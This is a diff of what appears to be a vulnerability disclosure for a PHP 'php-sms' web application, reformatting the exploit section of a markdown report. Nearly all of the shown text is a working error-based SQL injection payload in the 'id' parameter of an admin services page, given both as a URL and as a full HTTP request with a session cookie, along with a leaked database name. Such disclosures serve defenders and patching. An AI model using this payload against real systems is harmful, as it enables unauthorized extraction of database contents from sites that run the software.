@@ -17,7 +17,8 @@ dbname =sms_db,length=6
 [+] Payload: /php-sms/admin/?page=services/view_service&id=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> id
 
 
-​```sql
+exp:
+```
 GET /php-sms/admin/?page=services/view_service&id=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
 Host: 192.168.1.88
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
@@ -27,6 +28,7 @@ Accept-Encoding: gzip, deflate
 DNT: 1
 Cookie: PHPSESSID=3puonr8mf2gr4m6iivf71mhjtq
 Connection: close
-​```
+```
+
 
 ![image](https://user-images.githubusercontent.com/54017627/195977623-b958f949-210a-494b-8e25-0823176e045d.png)
